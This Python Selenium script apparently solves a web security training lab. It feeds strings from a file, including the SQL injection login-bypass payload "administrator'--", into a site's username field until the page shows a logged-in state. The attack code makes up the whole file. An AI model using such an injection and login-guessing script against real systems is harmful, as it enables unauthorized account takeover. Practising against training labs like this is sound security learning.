from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import requests
import urllib3
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
import sys

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'https://127.0.0.1:8080'}

payload = "administrator'--"

password = '1234'

csrf = "XPbisDSRFJCubGzGb0uP0TK4EcwIu8It"



headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}
chrome_options = Options()
#chrome_options.add_argument('--headless')  # Run Chrome in headless mode (no GUI)
chrome_options.add_argument('--no-sandbox')  # Bypass OS security model
chrome_options.add_argument('--disable-dev-shm-usage')  # Overcome limited resource problems


#time.sleep(2)
#s = requests.Session()

def login():
    

    
    input_field = driver.find_element(By.NAME, "username")
    input_password = driver.find_element(By.NAME, "password")
    input_field.clear()
    input_field.send_keys(x)
    #time.sleep(2)
    input_password.send_keys('random')
    
    login_button = driver.find_element(By.CSS_SELECTOR, "button") 

    login_button.click()


    html_content = driver.page_source

    if "Log out" in html_content:
        print("you got it!")
        print(f"\033[1;31;40mthe word was succesful are: \033[34m{x}\033[0m")
        sys.exit(0)
        
    else:
        print("try again man!")
        driver.back()
       
     
if __name__ == "__main__":
    url = "https://0a87006704f3449a819b6b4d008f007f.web-security-academy.net/login"
    webdriver_path = 'chromedriver.exe'
    driver = webdriver.Chrome(options=chrome_options)
    driver.get(url)
    
    #words = ("hello", "administrator'--", "ariel", "man")
    with open("strings.txt", 'r') as file:
        for x in file:
            login()
    
    driver.quit()
